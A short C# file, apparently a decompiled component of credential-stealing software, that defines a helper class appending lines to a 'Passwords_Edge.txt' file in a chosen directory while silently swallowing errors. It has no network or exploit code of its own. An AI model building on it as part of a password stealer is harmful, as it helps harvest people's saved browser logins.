using System.Collections.Generic;
using System.IO;

namespace Echelon
{
	public static class DesktopWriter
	{
		private static string a = "";

		public static void SetDirectory(string dir)
		{
			try
			{
				a = dir;
			}
			catch
			{
			}
		}

		public static void WriteLine(string str)
		{
			try
			{
				File.AppendAllLines(Path.Combine(a, "Passwords_Edge.txt"), new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}
	}
}
